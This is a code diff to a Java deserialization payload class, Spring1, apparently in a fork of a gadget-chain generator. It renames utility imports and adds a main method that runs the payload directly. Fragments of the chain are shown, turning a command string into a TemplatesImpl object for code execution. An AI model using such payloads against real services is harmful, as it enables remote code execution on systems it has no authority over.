@@ -8,14 +8,15 @@ import java.lang.reflect.Type;
 
 import javax.xml.transform.Templates;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.springframework.beans.factory.ObjectFactory;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.JavaVersion;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.Reflections;
 
 /*
 	Gadget chain:
@@ -49,7 +50,7 @@ import A.R.ysogate.payloads.util.Reflections;
 @SuppressWarnings({"rawtypes"})
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
 @Authors({Authors.FROHOFF})
-public class Spring1 implements ObjectPayload<Object> {
+public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
@@ -70,6 +71,10 @@ public class Spring1 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
 		return mitp;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Spring1.class, args);
 	}
 
 	public static boolean isApplicableJavaVersion() {
